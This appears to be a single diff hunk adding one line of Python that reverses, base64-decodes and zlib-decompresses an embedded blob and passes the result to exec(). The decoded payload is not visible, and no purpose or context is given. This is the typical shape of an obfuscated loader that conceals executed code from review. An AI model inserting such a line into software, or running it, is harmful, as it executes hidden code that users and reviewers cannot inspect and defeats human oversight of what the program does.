@@ -1,0 +1,1 @@
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'bH/JTCgfvFkEB+fQf38xio1vxUs5ZJRLmWAxMgkoqpD04G6fGLP7gaHdOg9SIkapelSAqELOx4PAhYxpfQL6NYF+ifaWQ05vmOHn2tNcGIC2irm0WhTogSMmd0sWDiRBUFEcqZ2uvjhOtciQH0ieKLJJHqOCOINe+7tGqibm0EEoPZ1GJq5gX7t80mbSHVxketrAwolVCuFa/J2dI1GN879+fvmuVzwCA5LPtlmkQTMyYcBXod9EFFk3gcgoeefhQAjgO0kk9xJe'))
